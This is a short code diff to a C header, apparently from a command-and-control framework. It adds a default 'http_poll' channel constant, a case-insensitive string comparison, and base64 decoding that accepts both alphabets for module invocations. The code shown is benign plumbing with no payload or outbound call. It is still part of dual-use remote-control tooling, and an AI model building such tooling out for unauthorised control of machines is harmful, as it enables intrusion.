@@ -92,6 +92,9 @@ extern "C" {
 #define C2_ROUTE_DEFAULT_WWW "c2-www"
 #define C2_ROUTE_DEFAULT_PROXY "c2-proxy"
 
+/* Default channel wrapper (def.C2ChannelModeDefault). */
+#define C2_CHANNEL_DEFAULT "http_poll"
+
 /* ------------------------------------------------------------------------- */
 /* MsgAuth.Capabilities tokens                                                */
 /* ------------------------------------------------------------------------- */
@@ -268,6 +271,22 @@ static inline int c2_str_equal_str(c2_str a, c2_str b) {
 /* Hex and base64url (URL-safe, padded) text codecs                           */
 /* ------------------------------------------------------------------------- */
 
+/* ASCII case-insensitive C-string equality (a NULL only equals a NULL). */
+static inline int c2_str_eq_ci(const char *a, const char *b) {
+  if (a == NULL || b == NULL)
+    return a == b;
+  while (*a && *b) {
+    char x = *a++, y = *b++;
+    if (x >= 'A' && x <= 'Z')
+      x = (char)(x + 32);
+    if (y >= 'A' && y <= 'Z')
+      y = (char)(y + 32);
+    if (x != y)
+      return 0;
+  }
+  return *a == '\0' && *b == '\0';
+}
+
 static inline size_t c2_hex_encode(const uint8_t *in, size_t n, char *out) {
   static const char digits[] = "0123456789abcdef";
   for (size_t i = 0; i < n; i++) {
@@ -336,16 +355,17 @@ static inline int c2_base64url_value(char c) {
     return c - 'a' + 26;
   if (c >= '0' && c <= '9')
     return c - '0' + 52;
-  if (c == '-')
+  if (c == '-' || c == '+')
     return 62;
-  if (c == '_')
+  if (c == '_' || c == '/')
     return 63;
   return -1;
 }
 
 /*
- * Decode URL-safe base64 with padding into out. Accepts only the canonical
- * padded form. Returns C2_OK and sets *out_len on success, else a c2_status.
+ * Decode base64 with padding into out. Both the URL-safe and the standard
+ * alphabets are accepted (the C2 uses standard base64 for module invocations).
+ * Returns C2_OK and sets *out_len on success, else a c2_status.
  */
 static inline c2_status c2_base64url_decode(const char *in, size_t n,
                                             uint8_t *out, size_t cap,
